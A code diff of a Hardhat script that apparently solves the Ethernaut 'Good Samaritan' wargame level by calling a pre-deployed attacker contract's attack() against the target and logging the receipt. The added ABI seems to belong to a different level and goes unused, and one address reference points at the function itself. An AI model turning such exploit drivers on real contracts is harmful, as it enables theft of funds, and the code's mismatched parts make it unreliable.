@@ -1,6 +1,7 @@
 import { AbiCoder } from "@ethersproject/abi";
 import { Wallet } from "ethers";
 import { ethers } from "hardhat";
+import { waitForDebugger } from "inspector";
 
 const attackGoodSamaritan = async () => {
     // change contract addresses here.
@@ -44,9 +45,41 @@ const attackGoodSamaritan = async () => {
     //     }
     // }
 
+    const ABI = [
+        {
+            constant: true,
+            inputs: [],
+            name: "_king",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            payable: undefined,
+            stateMutability: "view",
+            type: "function",
+        },
+        {
+            constant: true,
+            inputs: [],
+            name: "prize",
+            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+            payable: undefined,
+            stateMutability: "view",
+            type: "function",
+        },
+        {
+            constant: undefined,
+            inputs: [],
+            name: "owner",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
+            payable: undefined,
+            stateMutability: "nonpayable",
+            type: "function",
+        },
+    ];
+    const contract = await ethers.getContractAt(ABI, goodSamaritanAddress);
     const attack = await ethers.getContractAt("AttackGoodSamaritan", attackGoodSamaritan.address);
     console.log("Sending attack using player's contract...");
     const tx = await attack.attack(goodSamaritanAddress);
+    const txReceipt = await tx.wait();
+    console.log(txReceipt);
 };
 
 attackGoodSamaritan()
